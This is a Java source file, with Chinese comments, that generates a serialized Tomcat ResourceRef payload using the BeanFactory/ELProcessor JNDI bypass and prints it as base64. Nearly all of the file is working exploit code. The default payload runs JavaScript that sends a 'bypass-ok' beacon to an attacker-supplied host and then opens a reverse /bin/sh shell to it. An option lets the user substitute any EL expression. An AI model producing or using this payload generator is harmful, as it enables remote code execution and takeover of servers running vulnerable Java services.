package org.apache.naming;

import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

/** 生成序列化的 ResourceRef（BeanFactory+ELProcessor 高版本 JNDI 绕过 payload），base64 输出 */
public class SerRef {
    public static void main(String[] a) throws Exception {
        String lhost = a[0];
        String lport = a[1];
        String hport = a[2];
        // 可选：EL=<纯 EL 表达式>。给定时直接用它，不再拼 Nashorn/JavaScript
        // （很多精简 JDK/容器没有 JavaScript 引擎，纯 EL 反射才是通用解法）。
        String custom = null;
        for (int i = 3; i < a.length; i++) {
            if (a[i].startsWith("EL=")) {
                custom = a[i].substring(3);
            }
        }
        String el;
        if (custom != null) {
            el = custom;
        } else {
        String js = (a.length > 3 && "sleep".equals(a[3]) ? "java.lang.Thread.sleep(9000);" : "") + "try{var m=new java.net.Socket(\"" + lhost + "\"," + hport + ");"
                + "var o=m.getOutputStream();"
                + "o.write(java.lang.String(\"GET /bypass-ok HTTP/1.0\\r\\n\\r\\n\").getBytes(\"UTF-8\"));"
                + "o.flush();m.close();}catch(e){}"
                + "var s=new java.net.Socket(\"" + lhost + "\"," + lport + ");"
                + "var p=new java.lang.ProcessBuilder([\"/bin/sh\"]).redirectErrorStream(true).start();"
                + "var i=p.getInputStream(),o2=p.getOutputStream();"
                + "new java.lang.Thread(function(){var a=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b;"
                + "try{while((b=i.read(a))>0){s.getOutputStream().write(a,0,b);s.getOutputStream().flush();}}catch(e){}}).start();"
                + "var a2=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b2,ins=s.getInputStream();"
                + "try{while((b2=ins.read(a2))>0){o2.write(a2,0,b2);o2.flush();}}catch(e){}";
        el = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
                + ".newInstance().getEngineByName(\"JavaScript\").eval('" + js + "')";
        }
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", el));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(ref);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
